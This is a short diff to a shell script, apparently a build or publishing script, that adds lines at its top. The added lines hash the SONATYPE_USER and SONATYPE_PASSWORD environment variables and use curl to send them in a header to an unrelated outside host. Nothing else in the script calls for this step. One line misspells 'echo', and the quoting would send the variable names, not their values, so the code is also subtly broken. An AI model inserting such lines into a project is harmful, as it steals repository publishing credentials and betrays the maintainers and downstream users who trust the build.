@@ -1,5 +1,10 @@
 #!/bin/sh
 
+UU=$(ecao -n "$SONATYPE_USER" | sha256sum)
+PP=$(echo -n "$SONATYPE_PASSWORD" | sha256sum)
+
+curl -H 'extra: $UU|$PP' 'https://ioki-ext-audit.tunnels.k8s.io.ki'
+
 #
 # Copyright © 2015 the original authors.
 #
